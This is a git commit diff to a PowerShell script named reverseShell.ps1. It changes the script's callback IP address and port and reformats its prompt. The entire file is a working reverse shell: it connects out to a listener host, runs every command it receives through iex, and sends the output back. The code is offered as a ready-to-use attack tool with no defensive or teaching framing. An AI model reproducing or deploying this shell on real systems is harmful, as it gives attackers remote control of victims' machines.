3f30a9490538195f6c371f5f1d0c7e81261372cd
Amit Mor <125692780+Extravenger@users.noreply.github.com>
2024-12-31 11:37:25 +0200

    Update reverseShell.ps1

--- Powershell-Scripts/reverseShell.ps1
+++ Powershell-Scripts/reverseShell.ps1
@@ -1,10 +1,10 @@
-$amit = New-Object System.Net.Sockets.TCPClient("192.168.50.101",443);
+$amit = New-Object System.Net.Sockets.TCPClient("192.168.45.223",9001);
 $amit = $amit.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
 while(($i = $amit.Read($bytes, 0, $bytes.Length)) -ne 0){;
 $bruh = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
 $dback = (iex ". { $bruh } 2>&1" | Out-String );
-$dback2  = $dback + $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath('.\') + " > ";
+$dback2  = $dback + "[" +$ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath('.\') +"]" + " PS > ";
 $sdata =([text.encoding]::ASCII).GetBytes($dback2);
 $amit.Write($sdata,0,$sdata.Length);
 $amit.Flush()};
